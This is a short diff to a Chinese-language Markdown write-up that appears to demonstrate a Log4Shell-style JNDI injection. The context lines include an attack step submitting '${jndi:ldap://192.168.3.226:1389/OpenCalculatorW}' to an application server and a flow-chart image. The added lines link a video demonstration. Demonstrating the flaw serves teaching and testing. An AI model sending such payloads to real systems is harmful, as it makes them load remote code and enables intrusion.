@@ -14,3 +14,5 @@
    1. 对应用服务器输入```${jndi:ldap://192.168.3.226:1389/OpenCalculatorW}```进行攻击
 5. 攻击过程流程图
    <img src='攻击流程图.png'>
+   
+[视频演示](https://www.bilibili.com/video/BV1aR4y1W7xR?spm_id_from=333.999.0.0)
